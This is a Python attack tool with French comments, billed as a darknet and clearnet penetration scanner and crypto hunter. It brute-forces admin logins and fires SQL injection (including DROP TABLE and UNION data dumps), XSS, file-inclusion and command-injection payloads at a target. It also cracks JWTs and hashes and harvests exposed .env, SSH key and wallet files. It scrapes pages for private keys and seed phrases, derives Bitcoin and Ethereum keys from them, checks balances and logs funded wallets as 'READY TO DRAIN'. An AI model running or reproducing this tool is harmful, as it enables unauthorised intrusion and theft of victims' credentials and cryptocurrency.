import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse, urljoin, quote
import threading
import time
import re
import sys
import hashlib
import jwt
import socket
import ssl
import base64
import json
from datetime import datetime
import re
from eth_account import Account
from bip_utils import Bip39SeedGenerator
import bip32utils
import hashlib
import requests
import time
from datetime import datetime

# ====================== BALANCE CHECK FUNCTIONS ======================
def get_eth_balance(address: str) -> float:
    try:
        r = requests.get(
            f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest",
            timeout=10
        )
        data = r.json()
        if data.get("status") == "1":
            return int(data["result"]) / 1e18
    except:
        pass
    return 0.0

def get_btc_balance(address: str) -> float:
    try:
        r = requests.get(f"https://mempool.space/api/address/{address}", timeout=10)
        data = r.json()
        balance_sat = (data.get("chain_stats", {}).get("funded_txo_sum", 0) -
                      data.get("chain_stats", {}).get("spent_txo_sum", 0))
        return round(balance_sat / 100_000_000, 8)
    except:
        return 0.0

def check_all_balances(mnemonic: str, btc_addresses: dict, eth_addresses: list):
    print("\n" + "═"*100)
    print("💎 BALANCE CHECK ENGINE v1 - SCANNING ALL DERIVED ACCOUNTS")
    print(f"Mnemonic : {mnemonic}\n")
    
    has_funds = False
    
    for name, addr in btc_addresses.items():
        balance = get_btc_balance(addr)
        print(f"₿  BTC {name:12} → {addr}")
        print(f"     Balance    : {balance:.8f} BTC")
        if balance > 0.00005:
            has_funds = True
            print("     → FUNDS DETECTED !")
    
    print("\n    Ethereum:")
    for idx, addr in enumerate(eth_addresses):
        balance = get_eth_balance(addr)
        print(f"⟠  ETH Account {idx} → {addr}")
        print(f"     Balance    : {balance:.6f} ETH")
        if balance > 0.001:
            has_funds = True
            print("     → FUNDS DETECTED !")
    
    if has_funds:
        print("\n🚨🚨🚨 WALLET WITH POSITIVE BALANCE FOUND - READY TO DRAIN 🚨🚨🚨")
        with open("HITS_WITH_BALANCE.txt", "a", encoding="utf-8") as f:
            f.write(f"\n{'='*90}\n")
            f.write(f"DATE     : {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"MNEMONIC : {mnemonic}\n\n")
            for name, addr in btc_addresses.items():
                f.write(f"BTC {name}: {addr} | {get_btc_balance(addr):.8f} BTC\n")
            for idx, addr in enumerate(eth_addresses):
                f.write(f"ETH {idx}: {addr} | {get_eth_balance(addr):.6f} ETH\n")
            f.write(f"{'='*90}\n")
    else:
        print("Aucun solde significatif détecté.")
    
    print("═"*100 + "\n")
    time.sleep(1.2)  # Respect des limites d'API


# ===================== CONFIG =====================
TOR_PROXIES = {
    'http':  'socks5h://127.0.0.1:9050',
    'https': 'socks5h://127.0.0.1:9050'
}

COMMON_DIRS = [
    'admin', 'login', 'administrator', 'wp-admin', 'phpmyadmin', 'dashboard', 'panel', 'cpanel', 'api', 'backup',
    'shell', 'config', 'keys', 'wallet', 'keystore', 'crypto', 'secret', 'debug', 'test', 'dev', 'staging', 'old',
    '.git', '.env', 'uploads', 'files', 'data', 'db', 'database', 'rpc', 'node', 'geth', 'bitcoin'
]

COMMON_FILES = [
    '.env', 'config.php', 'config.json', 'keystore.json', 'wallet.dat', 'id_rsa', 'id_rsa.pub', 'seed.txt',
    'privatekey.txt', 'mnemonic.txt', 'backup.sql', '.git/HEAD', 'debug.log', 'error.log', 'wallet.json',
    'credentials.json', 'secrets.json', 'docker-compose.yml', 'htpasswd', 'passwd', 'key.pem', 'private.pem'
]

SQLI_PAYLOADS = [
    "'", "1' OR '1'='1", "' UNION SELECT NULL--", "' UNION SELECT @@version--",
    "' UNION SELECT schema_name FROM information_schema.schemata--",
    "' UNION SELECT table_name FROM information_schema.tables--",
    "'; DROP TABLE users;--", "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--"
]

XSS_PAYLOADS = [
    "<script>alert(1)</script>", "\"><script>alert(1)</script>", "javascript:alert(1)",
    "", "';alert(1)//"
]

LFI_PAYLOADS = [
    "../../../../etc/passwd", "....//....//....//etc/passwd", "/var/www/html/index.php",
    "php://filter/convert.base64-encode/resource=index", "expect://id"
]

CMD_INJECTION_PAYLOADS = [";ls", "& whoami", "| id", "$(cat /etc/passwd)"]

COMMON_JWT_SECRETS = ["secret", "password", "admin", "123456", "key", "jwtsecret", "supersecret", "dev", "test", "private", "crypto"]

WEAK_HASH_WORDLIST = ["password", "admin", "123456", "qwerty", "letmein", "welcome", "secret", "test", "123", "abc123", "bitcoin", "crypto", "wallet"]

BIP39_WORDS = ["abandon","ability","able","about","above","absent","absorb","abstract","absurd","abuse","access","accident","account","accuse","achieve","acid","acoustic","acquire","across","act","action","actor","actress","actual","adapt","add","addict","address","adjust","admit","adult","advance","advice","aerobic","affair","afford","afraid","after","again","age","agent","agree","ahead","aim","air","airport","aisle","alarm","album","alcohol","alert","alien","all","alley","allow","almost","alone","alpha","already","also","alter","always","amateur","amazing","among","amount","amused","analyst","anchor","ancient","anger","angle","angry","animal","ankle","announce","annual","another","answer","antenna","antique","anxiety","any","apart","apology","appear","apple","approve","april","arch","arctic","area","arena","argue","arm","armed","armor","army","around","arrange","arrest","arrive","arrow","art","artefact","artist","artwork","ask","aspect","assault","asset","assist","assume","asthma","athlete","atom","attack","attend","attitude","attract","auction","audit","august","aunt","author","auto","autumn","average","avocado","avoid","awake","aware","away","awesome","awful","awkward","axis","baby","bachelor","back","bacon","badge","bag","balance","balcony","ball","bamboo","banana","banner","bar","barely","bargain","barrel","base","basic","basket","battle","beach","bean","beauty","because","become","beef","before","begin","behave","behind","believe","below","belt","bench","benefit","best","betray","better","between","beyond","bicycle","bid","bike","bind","biology","bird","birth","bitter","black","blade","blame","blanket","blast","bleak","bless","blind","blood","blossom","blouse","blue","blur","blush","board","boat","body","boil","bomb","bone","bonus","book","boost","border","boring","borrow","boss","bottom","bounce","box","boy","bracket","brain","brand","brass","brave","bread","break","breast","breath","brick","bridge","brief","bright","bring","brisk","broccoli","broken","bronze","broom","brother","brown","brush","bubble","budget","buffalo","build","bulb","bulk","bullet","bundle","burden","burger","burst","bus","business","busy","butter","button","buy","buzz","cabbage","cabin","cable","cactus","cage","cake","call","calm","camera","camp","can","canal","cancel","candy","cannon","canoe","canvas","canyon","capable","capital","captain","car","carbon","card","cargo","carpet","carry","cart","case","cash","casino","castle","casual","cat","catalog","catch","category","cattle","caught","cause","caution","cave","ceiling","celery","cement","census","century","cereal","certain","chair","chalk","champion","change","chaos","chapter","charge","chase","chat","cheap","check","cheese","chef","cherry","chest","chicken","chief","child","chimney","choice","choose","chronic","chuckle","chunk","church","cigar","cinnamon","circle","citizen","city","civil","claim","clap","clarify","claw","clay","clean","clear","clerk","clever","click","client","cliff","climb","clinic","clip","clock","clog","close","cloth","cloud","clown","club","clump","cluster","clutch","coach","coast","coconut","code","coffee","coil","coin","collect","color","column","combine","come","comfort","comic","common","company","compare","compete","compile","complain","complete","complex","component","compose","compound","comprehensive","computer","concentrate","concept","concern","concert","conduct","confirm","conflict","congress","connect","consider","control","convince","cook","cool","copper","copy","coral","core","corn","correct","cost","cotton","couch","could","count","country","couple","course","cousin","cover","cow","crack","craft","crash","crawl","crazy","cream","create","credit","creek","crew","cricket","crime","crisp","critic","crop","cross","crouch","crowd","crucial","cruel","cruise","crush","cry","crystal","cube","culture","cup","cupboard","curious","current","curtain","curve","cushion","custom","cute","cycle","dad","damage","damp","dance","danger","dark","dash","daughter","dawn","day","deal","debate","debris","decade","december","decide","decline","decorate","decrease","deer","defense","define","defy","degree","delay","deliver","demand","demise","denial","denounce","dense","deny","depart","depend","deposit","depth","deputy","derive","describe","desert","design","desk","despair","destroy","detail","detect","develop","device","devote","diagram","dial","diamond","diary","dice","diesel","diet","differ","digital","dignity","dilemma","dinner","dinosaur","direct","dirt","disagree","discover","disease","dish","dismiss","disorder","display","distance","distinct","distribute","district","divide","divorce","dizzy","doctor","document","dog","doll","domain","donate","donkey","donor","door","dose","double","dove","draft","dragon","drama","drastic","draw","dream","dress","drift","drill","drink","drip","drive","drop","drum","dry","duck","dumb","during","dust","dutch","duty","each","eager","early","earn","earth","easily","east","easy","echo","ecology","economy","edge","edit","educate","effort","egg","eight","either","elder","electric","elegant","element","elephant","elevator","elite","else","embark","embody","embrace","emerge","emotion","employ","empower","empty","enable","enact","end","endless","endorse","enemy","energy","enforce","engage","engine","enhance","enjoy","enlarge","enough","enrich","enroll","ensure","enter","entire","entry","envelope","episode","equal","equip","era","erase","erode","erosion","error","erupt","escape","essay","essence","estate","eternal","ethics","evidence","evil","evoke","evolve","exact","example","excess","exchange","excite","exclude","excuse","execute","exercise","exhaust","exhibit","exile","exist","exit","exotic","expand","expect","expense","experience","expert","explain","expose","express","extend","extra","eye","eyebrow","fabric","face","faculty","fade","faint","fair","faith","fall","false","fame","family","famous","fan","fancy","fantasy","farm","fashion","fat","fatal","father","fatigue","fault","favorite","fear","feather","feature","february","federal","fee","feed","feel","female","fence","festival","fetch","fever","few","fiber","fiction","field","figure","file","film","filter","final","find","fine","finger","finish","fire","firm","first","fiscal","fish","fit","fitness","fix","flag","flame","flash","flat","flavor","flee","flight","flip","float","flock","floor","flower","fluid","flush","fly","foam","focus","fog","foil","fold","follow","food","foot","football","force","forest","forget","fork","fortune","forum","forward","fossil","foster","found","fox","fragile","frame","frequent","fresh","friend","frog","from","front","frost","frown","frozen","fruit","fuel","fun","funny","furnace","fury","future","gadget","gain","galaxy","gallery","game","gap","garage","garbage","garden","garlic","garment","gas","gasp","gate","gather","gauge","gaze","general","genius","genre","gentle","genuine","gesture","ghost","giant","gift","giggle","ginger","giraffe","girl","give","glad","glance","glare","glass","glide","glimpse","global","glory","glove","glow","glue","goat","goddess","gold","good","goose","gorilla","gospel","gossip","govern","gown","grab","grace","grain","grant","grape","grass","gravity","great","green","grid","grief","grit","grocery","ground","group","grow","grunt","guard","guess","guide","guilt","guitar","gun","gym","habit","hair","half","hammer","hamster","hand","happy","harbor","hard","harsh","harvest","hat","have","hawk","hazard","head","health","heart","heavy","hedgehog","height","hello","helmet","help","hen","hero","hidden","high","hill","hint","hip","hire","history","hobby","hockey","hold","hole","holiday","hollow","home","honey","hood","hook","hope","horn","horror","horse","hospital","host","hotel","hour","hover","how","huge","human","humble","humor","hundred","hungry","hunt","hurdle","hurry","hurt","husband","hybrid","ice","idea","identify","idle","ignore","ill","illegal","illness","image","imitate","immense","immune","impact","impose","improve","impulse","inch","include","income","increase","index","indicate","indoor","industry","infant","inflict","inform","inhale","inherit","initial","inject","injury","inmate","inner","innocent","input","inquiry","insane","insect","inside","inspire","install","intact","interest","into","invest","invite","involve","iron","island","isolate","issue","item","ivory","jacket","jaguar","jar","jazz","jealous","jeans","jelly","jewel","job","join","joke","journey","joy","judge","juice","jump","jungle","junior","junk","just","kangaroo","keen","keep","ketchup","key","kick","kid","kidney","kind","kingdom","kiss","kit","kitchen","kite","kitten","kiwi","knee","knife","knock","know","lab","label","labor","ladder","lady","lake","lamp","language","laptop","large","later","latin","laugh","laundry","lava","law","lawn","lawsuit","layer","lazy","leader","leaf","learn","leave","lecture","left","leg","legal","legend","leisure","lemon","lend","length","lens","leopard","lesson","letter","level","liar","liberty","library","license","life","lift","light","like","limb","limit","link","lion","lip","liquid","list","little","live","lizard","load","loan","lobster","local","lock","logic","lonely","long","loop","lottery","loud","lounge","love","loyal","lucky","luggage","lumber","lunar","lunch","lung","luxury","lyrics","machine","mad","magic","magnet","maid","mail","main","major","make","mammal","man","manage","mandate","mango","mansion","manual","map","marble","march","margin","marine","market","marriage","mask","mass","master","match","material","math","matrix","matter","maximum","may","maybe","mayor","meadow","mean","measure","meat","mechanic","medal","media","melody","melt","member","memory","mention","menu","mercy","merge","merit","merry","mesh","message","metal","method","middle","midnight","milk","million","mimic","mind","minimum","minor","minute","miracle","mirror","misery","miss","mistake","mix","mixed","mixture","mobile","model","modify","mom","moment","monitor","monkey","monster","month","moon","moral","more","morning","mosquito","mother","motion","motor","mountain","mouse","move","movie","much","muffin","mule","multiply","muscle","museum","mushroom","music","must","mutual","myself","mystery","myth","naive","name","napkin","narrow","nasty","nation","nature","near","neck","need","negative","neglect","neither","nephew","nerve","nest","net","network","neutral","never","news","next","nice","night","noble","noise","nominee","noodle","normal","north","nose","notable","note","nothing","notice","novel","now","nuclear","number","nurse","nut","oak","obey","object","oblige","obscure","observe","obtain","obvious","occur","ocean","october","odor","off","offer","office","often","oil","okay","old","olive","olympic","omit","once","one","onion","online","only","open","opera","opinion","oppose","option","orange","orbit","orchard","order","ordinary","organ","orient","original","orphan","ostrich","other","outdoor","outer","output","outside","oval","oven","over","own","owner","oxygen","oyster","ozone","pact","paddle","page","pair","palace","palm","panda","panel","panic","panther","paper","parade","parent","park","parrot","party","pass","patch","path","patient","patrol","pattern","pause","pave","payment","peace","peanut","pear","peasant","pelican","pen","penalty","pencil","people","pepper","perfect","permit","person","pet","phone","photo","phrase","physical","piano","picnic","picture","piece","pig","pigeon","pill","pillow","pilot","pink","pioneer","pipe","pistol","pitch","pizza","place","planet","plastic","plate","play","please","pledge","plug","plunge","poem","poet","point","poison","police","polish","polite","political","poll","pond","pony","pool","popular","porch","pork","port","portrait","position","possible","post","potato","pottery","poverty","powder","power","practice","praise","predict","prefer","prepare","present","pretty","prevent","price","pride","primary","print","priority","prison","private","prize","problem","process","produce","profit","program","project","promote","proof","property","prosper","protect","proud","provide","public","pudding","pull","pulp","pulse","pumpkin","punch","pupil","puppy","purchase","pure","purpose","purse","push","put","puzzle","pyramid","quality","quantum","quarter","question","quick","quit","quiz","quote","rabbit","raccoon","race","rack","radar","radio","rail","rain","raise","rally","ramp","ranch","random","range","rapid","rare","rate","rather","raven","raw","razor","ready","real","reason","rebel","rebuild","recall","receive","recipe","record","recycle","reduce","reflect","reform","refuse","region","regret","regular","reject","relax","release","relief","rely","remain","remember","remind","remove","render","renew","rent","reopen","repair","repeat","replace","report","require","rescue","resemble","resist","resource","response","result","retire","return","reunion","reveal","review","reward","rhythm","rib","ribbon","rice","rich","ride","ridge","rifle","right","rigid","ring","riot","ripple","risk","ritual","rival","river","road","roast","robot","robust","rocket","romance","roof","room","rose","rotate","rough","round","route","royal","rubber","rude","rug","rule","run","runway","rural","sad","saddle","sadness","safe","sail","salad","salmon","salon","salt","same","sample","sand","satisfy","satoshi","sauce","sausage","save","say","scale","scan","scare","scatter","scene","scheme","school","science","scissors","scorpion","scout","scrap","screen","script","scrub","sea","search","season","seat","second","secret","section","security","seed","seek","segment","select","sell","seminar","senior","sense","sentence","series","service","session","settle","setup","seven","shadow","shaft","shallow","share","shed","shell","sheriff","shield","shift","shine","ship","shiver","shock","shoe","shoot","shop","short","shoulder","shove","shrimp","shrug","shuffle","shy","sibling","sick","side","siege","sight","sign","silent","silk","silly","silver","similar","simple","since","sing","siren","sister","situate","six","size","skate","sketch","ski","skill","skin","skirt","skull","slab","slam","sleep","slender","slice","slide","slight","slim","slogan","slot","slow","slush","small","smart","smile","smoke","smooth","snack","snake","snap","sniff","snow","soap","soccer","social","sock","soda","soft","solar","soldier","solid","solution","solve","someone","song","soon","sorry","sort","soul","sound","soup","source","south","space","spare","spatial","spawn","speak","special","speed","spell","spend","sphere","spice","spider","spike","spin","spirit","split","spoil","sponsor","spoon","sport","spot","spray","spread","spring","spy","square","squeeze","squirrel","stable","stadium","staff","stage","stairs","stamp","stand","start","state","stay","steak","steel","stem","step","stereo","stick","still","sting","stock","stomach","stone","stool","story","stove","strategy","street","strike","strong","struggle","student","stuff","stumble","style","subject","submit","subway","success","such","sudden","suffer","sugar","suggest","suit","summer","sun","sunny","sunset","super","supply","supreme","sure","surface","surge","surprise","surround","survey","suspect","sustain","swallow","swamp","swap","swear","sweet","swift","swim","swing","switch","sword","symbol","symptom","syrup","system","table","tackle","tag","tail","talent","talk","tank","tape","target","task","taste","tattoo","taxi","teach","team","tell","ten","tenant","tennis","tent","term","test","text","thank","that","theme","then","theory","there","they","thick","thing","this","thought","three","thrive","throw","thumb","thunder","ticket","tide","tiger","tilt","timber","time","tiny","tip","tired","tissue","title","toast","tobacco","today","toddler","toe","together","toilet","token","tomato","tomorrow","tone","tongue","tonight","tool","tooth","top","topic","torch","tornado","tortoise","toss","total","tourist","toward","tower","town","toy","track","trade","traffic","tragic","train","transfer","trap","trash","travel","tray","treat","tree","trend","trial","tribe","trick","trigger","trim","trip","trophy","trouble","truck","true","truly","trumpet","trust","truth","try","tube","tuition","tumble","tuna","tunnel","turkey","turn","turtle","twelve","twenty","twice","twin","twist","two","type","typical","ugly","umbrella","unable","unaware","uncle","uncover","under","undo","unfair","unfold","unhappy","uniform","unique","unit","universe","unknown","unlock","until","unusual","unveil","update","upgrade","upon","upper","upset","urban","urge","usage","use","used","useful","useless","usual","utility","vacant","vacuum","vague","valid","valley","valve","van","vanish","vapor","various","vast","vault","vehicle","velvet","vendor","venture","venue","verb","verify","version","very","vessel","veteran","viable","vibrant","vicious","victory","video","view","village","violin","virtual","virus","visa","visit","visual","vital","vivid","vocal","voice","void","volcano","volume","vote","voyage","wage","wagon","wait","walk","wall","walnut","want","warfare","warm","warrior","wash","wasp","waste","water","wave","way","wealth","weapon","wear","weasel","weather","web","wedding","weekend","weird","welcome","west","wet","whale","what","wheat","wheel","when","where","whip","whisper","wide","width","wife","wild","will","win","window","wine","wing","wink","winner","winter","wire","wisdom","wise","wish","witness","wolf","woman","wonder","wood","wool","word","work","world","worry","worth","wrap","wreck","wrestle","wrist","write","wrong","yard","year","yellow","you","young","youth","zebra","zero","zone","zoo"]

THREADS = 30
DELAY = 0.4
MAX_DEPTH = 4
MAX_VISITED = 150

visited = set()
findings = []
lock = threading.Lock()

# ===================== AUTO DETECTION =====================
def is_onion(url):
    return '.onion' in urlparse(url).netloc.lower()

def get_proxies(url):
    return TOR_PROXIES if is_onion(url) else None

def safe_request(url, method="GET", data=None, params=None, timeout=15):
    try:
        headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        proxies = get_proxies(url)
        if method == "GET":
            r = requests.get(url, proxies=proxies, headers=headers, timeout=timeout, verify=False)
        else:
            r = requests.post(url, proxies=proxies, headers=headers, data=data, timeout=timeout, verify=False)
        return r
    except:
        return None

def log_finding(severity, message, url):
    with lock:
        findings.append({"severity": severity, "message": message, "url": url, "time": datetime.now().isoformat()})
        print(f"[{severity}] {message} @ {url}")

# ===================== PRIVATE KEY & CRYPTO SCANNER (ULTRA SPECIALIZED) =====================
def private_key_scanner(base_url):
    print(f"\n[*] === PRIVATE KEY & CRYPTO SCANNER STARTED on {base_url} ===")
    r = safe_request(base_url)
    if not r or not r.text:
        return

    text = (r.text + str(r.cookies) + str(r.headers)).lower()

    # Bitcoin WIF
    btc_priv = re.findall(r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}', r.text)
    for key in btc_priv:
        log_finding("CRITICAL", f"BITCOIN PRIVATE KEY (WIF) FOUND", base_url)
        print(f"    → Key: {key}")

    # Ethereum / EVM Private Key
    eth_priv = re.findall(r'0x[a-fA-F0-9]{64}', r.text)
    for key in eth_priv:
        log_finding("CRITICAL", f"ETHEREUM PRIVATE KEY FOUND", base_url)
        print(f"    → Key: {key}")

    # PEM Private Keys
    pem_keys = re.findall(r'-----BEGIN (?:RSA |EC |OPENSSH |)PRIVATE KEY-----[\s\S]+?-----END (?:RSA |EC |OPENSSH |)PRIVATE KEY-----', r.text)
    for pem in pem_keys:
        log_finding("CRITICAL", f"PEM PRIVATE KEY FOUND", base_url)
        print(f"    → PEM snippet: {pem[:80]}...")

    # Wallet Addresses
    btc_addr = re.findall(r'(bc1[a-zA-Z0-9]{39,59}|[13][a-km-zA-HJ-NP-Z1-9]{25,34})', r.text)
    eth_addr = re.findall(r'0x[a-fA-F0-9]{40}', r.text)
    for addr in btc_addr + eth_addr:
        log_finding("HIGH", f"WALLET ADDRESS DETECTED", base_url)
        print(f"    → Address: {addr}")
        check_balance(addr)

    # BIP39 Mnemonic - FUTURE EXTRACTION ENGINE v4 (clé privée BTC/ETH + CHECK SOLDE)
    words_found = re.findall(r'\b(?:' + '|'.join(BIP39_WORDS) + r')\b', r.text.lower())
    if len(set(words_found)) >= 12:
        for length in [12, 24]:
            for i in range(len(words_found) - length + 1):
                candidate = words_found[i:i + length]
                if len(set(candidate)) < 8:
                    continue
                mnemonic = ' '.join(candidate)
                
                try:
                    seed_bytes = Bip39SeedGenerator(mnemonic).Generate()
                    
                    log_finding("CRITICAL", f"VALID BIP39 MNEMONIC ({length} words) - PRIVATE KEYS EXTRACTED", base_url)
                    print("\n" + "="*130)
                    print(f"[+] VALID SEED PHRASE EXTRAITE ({length} mots) :")
                    print(f"    {mnemonic}")
                    print("="*130)
                    print(f"    Seed (hex)       : {seed_bytes.hex()}")
                    
                    btc_addresses = {}
                    eth_addresses = []
                    
                    # ====================== BITCOIN DERIVATIONS ======================
                    root_key = bip32utils.BIP32Key.fromEntropy(seed_bytes)
                    for purpose, name in [(44, "Legacy"), (84, "Native Segwit"), (49, "Wrapped Segwit")]:
                        btc_key = root_key.ChildKey(purpose + bip32utils.BIP32_HARDEN)\
                                          .ChildKey(0 + bip32utils.BIP32_HARDEN)\
                                          .ChildKey(0).ChildKey(0)
                        wif = btc_key.WalletImportFormat()
                        priv = btc_key.PrivateKey().hex()
                        addr = btc_key.Address()
                        
                        print(f"    BTC {name:12} | Address : {addr}")
                        print(f"                  | WIF     : {wif}")
                        print(f"                  | PrivKey : {priv}")
                        btc_addresses[name] = addr
                    
                    # ====================== ETHEREUM - 8 comptes ======================
                    print("\n    Ethereum Accounts:")
                    for idx in range(8):
                        acct = Account.from_mnemonic(mnemonic, account_path=f"m/44'/60'/0'/0/{idx}")
                        eth_addresses.append(acct.address)
                        print(f"    ETH Account {idx:2} | Address : {acct.address}")
                        print(f"                  | PrivKey : {acct.key.hex()}")
                    
                    # ====================== CHECK DES SOLDES ======================
                    check_all_balances(mnemonic, btc_addresses, eth_addresses)
                    
                    print("-"*130)
                    break
                    
                except Exception:
                    continue

    # Leak file enumeration + parsing
    for file in COMMON_FILES:
        test_url = urljoin(base_url.rstrip('/') + '/', file)
        resp = safe_request(test_url)
        if resp and resp.status_code == 200 and len(resp.text) > 10:
            log_finding("CRITICAL", f"EXPOSED SENSITIVE FILE", test_url)
            content = resp.text[:500]
            print(f"    Preview: {content}...")

            if '.env' in file or 'config' in file:
                priv_match = re.search(r'(?:PRIVATE_KEY|MNEMONIC|SEED|WALLET_SECRET|API_KEY)=["\']?([A-Za-z0-9_\/+=\-]+)["\']?', resp.text)
                if priv_match:
                    log_finding("CRITICAL", f"EXPOSED SECRET IN {file}: {priv_match.group(1)[:30]}...", test_url)

    print("[*] Private Key & Crypto Scanner finished.\n")


def check_balance(address):
    
    proxies = TOR_PROXIES
    try:
        if address.startswith('0x'):
            # ETH
            r = requests.get(f"https://api.etherscan.io/api?module=account&action=balance&address={address}&tag=latest", proxies=proxies, timeout=10)
            data = r.json()
            balance = int(data.get('result', 0)) / 1e18
            if balance > 0:
                log_finding("CRITICAL", f"ETHEREUM BALANCE FOUND: {balance} ETH on {address}", address)
        else:
            # BTC via mempool
            r = requests.get(f"https://mempool.space/api/address/{address}", proxies=proxies, timeout=10)
            data = r.json()
            balance = data.get('chain_stats', {}).get('funded_txo_sum', 0) - data.get('chain_stats', {}).get('spent_txo_sum', 0)
            if balance > 0:
                log_finding("CRITICAL", f"BITCOIN BALANCE FOUND: {balance} sats on {address}", address)
    except:
        pass

# ===================== CRYPTO PENETRATION =====================
def crypto_penetration(base_url):
    print(f"\n[*] === CRYPTO PENETRATION MODULE on {base_url} ===")
    parsed = urlparse(base_url)
    if base_url.startswith("https://"):
        try:
            hostname = parsed.hostname
            context = ssl.create_default_context()
            with socket.create_connection((hostname, 443), timeout=8) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    version = ssock.version()
                    if version in ["TLSv1", "TLSv1.1"]:
                        log_finding("HIGH", f"WEAK TLS VERSION: {version}", base_url)
        except:
            pass

    r = safe_request(base_url)
    if not r or not r.text:
        return

    # JWT
    jwt_pattern = re.compile(r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+')
    for token in jwt_pattern.findall(r.text):
        log_finding("HIGH", "JWT TOKEN FOUND", base_url)
        try:
            decoded = jwt.decode(token, options={"verify_signature": False})
            log_finding("CRITICAL", f"JWT 'none' ALGORITHM ACCEPTED - Payload: {decoded}", base_url)
        except:
            for secret in COMMON_JWT_SECRETS:
                try:
                    jwt.decode(token, secret, algorithms=["HS256"])
                    log_finding("CRITICAL", f"JWT CRACKED WITH SECRET: {secret}", base_url)
                    break
                except:
                    continue

    # Weak hashes
    hash_patterns = {
        'md5': re.compile(r'\b[a-f0-9]{32}\b'),
        'sha1': re.compile(r'\b[a-f0-9]{40}\b'),
        'sha256': re.compile(r'\b[a-f0-9]{64}\b')
    }
    for htype, pattern in hash_patterns.items():
        for h in pattern.findall(r.text):
            for word in WEAK_HASH_WORDLIST:
                if hashlib.new(htype, word.encode()).hexdigest() == h.lower():
                    log_finding("HIGH", f"WEAK HASH CRACKED → {h} = '{word}'", base_url)
                    break

    print("[*] Crypto penetration finished.\n")

# ===================== LOGIN BRUTE FORCE =====================
def brute_login(panel_url):
    print(f"[!] Starting aggressive brute force on: {panel_url}")
    common_creds = [("admin","admin"), ("admin","password"), ("root","root"), ("admin","123456"), ("user","user"), ("test","test"), ("crypto","crypto")]
    for user, pwd in common_creds:
        data = {"username": user, "password": pwd, "login": "1"}
        r = safe_request(panel_url, method="POST", data=data)
        if r and (r.status_code in (200, 302) or any(success in r.text.lower() for success in ["welcome", "dashboard", "success", "logged"])):
            log_finding("CRITICAL", f"LOGIN SUCCESS → {user}:{pwd}", panel_url)
            return True
    return False

# ===================== VULN MODULES =====================
def test_lfi(base_url):
    for payload in LFI_PAYLOADS:
        test_url = base_url + ("&" if "?" in base_url else "?") + "file=" + quote(payload)
        r = safe_request(test_url)
        if r and any(keyword in r.text for keyword in ["root:", "daemon:", "bin:", "/bin/bash"]):
            log_finding("CRITICAL", f"LFI VULNERABILITY EXPLOITABLE with payload {payload}", test_url)
            break

def test_cmd_injection(base_url):
    for payload in CMD_INJECTION_PAYLOADS:
        test_url = base_url + ("&" if "?" in base_url else "?") + "cmd=" + quote(payload)
        r = safe_request(test_url)
        if r and any(k in r.text.lower() for k in ["uid=", "root", "www-data", "linux"]):
            log_finding("CRITICAL", f"COMMAND INJECTION SUCCESS with {payload}", test_url)
            break

# ===================== MAIN CRAWLER =====================
def crawl_and_scan(base_url, depth=MAX_DEPTH):
    if depth == 0 or base_url in visited or len(visited) > MAX_VISITED:
        return
    with lock:
        visited.add(base_url)

    print(f"[+] Scanning: {base_url}")

    # Directory + file brute
    for item in COMMON_DIRS + COMMON_FILES:
        test_url = urljoin(base_url.rstrip('/') + '/', item if '.' in item or item.startswith('.') else item + '/')
        r = safe_request(test_url)
        if r and r.status_code in (200, 301, 302, 403):
            log_finding("INFO", f"Resource found (code {r.status_code})", test_url)
            if any(x in test_url.lower() for x in ["admin", "login", "panel", "dashboard"]):
                brute_login(test_url)

    # SQLi with exploitation
    if any(ext in base_url.lower() for ext in ('.php', '.asp', '.aspx', '.jsp')) or '?' in base_url:
        for payload in SQLI_PAYLOADS:
            test_url = base_url + ("&" if "?" in base_url else "?") + "id=1" + payload
            r = safe_request(test_url)
            if r and any(err in r.text.lower() for err in ["sql", "mysql", "syntax", "odbc", "postgresql", "database", "microsoft"]):
                log_finding("CRITICAL", f"SQL INJECTION FOUND", test_url)
                dump_url = base_url + ("&" if "?" in base_url else "?") + "id=1' UNION SELECT @@version,database(),user(),group_concat(table_name)--"
                dr = safe_request(dump_url)
                if dr and dr.text:
                    log_finding("CRITICAL", f"DATA EXTRACTED: {dr.text.strip()[:300]}", test_url)
                break

    # XSS
    for payload in XSS_PAYLOADS:
        test_url = base_url + ("&" if "?" in base_url else "?") + "q=" + quote(payload)
        r = safe_request(test_url)
        if r and payload in r.text:
            log_finding("HIGH", f"REFLECTED XSS FOUND", test_url)
            break

    # Additional modules
    test_lfi(base_url)
    test_cmd_injection(base_url)
    crypto_penetration(base_url)
    private_key_scanner(base_url)

    # Crawling
    r = safe_request(base_url)
    if not r or not r.text:
        return
    soup = BeautifulSoup(r.text, 'html.parser')
    for link in soup.find_all('a', href=True):
        full_url = urljoin(base_url, link['href'])
        if urlparse(full_url).netloc == urlparse(base_url).netloc and full_url not in visited:
            with lock:
                if len(visited) < MAX_VISITED:
                    t = threading.Thread(target=crawl_and_scan, args=(full_url, depth-1))
                    t.daemon = True
                    t.start()
                    time.sleep(DELAY)

def generate_report(target):
    report = {
        "target": target,
        "scan_date": datetime.now().isoformat(),
        "findings": findings,
        "summary": f"{len([f for f in findings if f['severity'] in ['CRITICAL','HIGH']])} critical/high issues found."
    }
    with open("darknet_scanner_report.json", "w", encoding="utf-8") as f:
        json.dump(report, f, indent=2)
    print("[*] Full JSON report saved to darknet_scanner_report.json")

def main():
    print("[*] Darknet & Clearnet FULL Penetration Scanner + Private Key & Crypto Hunter v4.0 (ALL MODULES)")
    if len(sys.argv) > 1:
        target = sys.argv[1]
    else:
        target = input("Entrez l'URL à scanner (clearnet ou .onion) : ").strip()

    if not target.startswith(("http://", "https://")):
        target = "http://" + target

    print(f"[*] Target: {target} | Mode: {'Tor (.onion)' if is_onion(target) else 'Clearnet'} | Starting full scan...\n")
    crawl_and_scan(target)
    generate_report(target)
    print("\n[*] Scan terminé. Tous les modules (SQLi, XSS, LFI, CMDi, JWT, TLS, Private Keys, Mnemonics, Wallets, Balance Check, Login Brute, Leak Files) ont été exécutés.")

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()

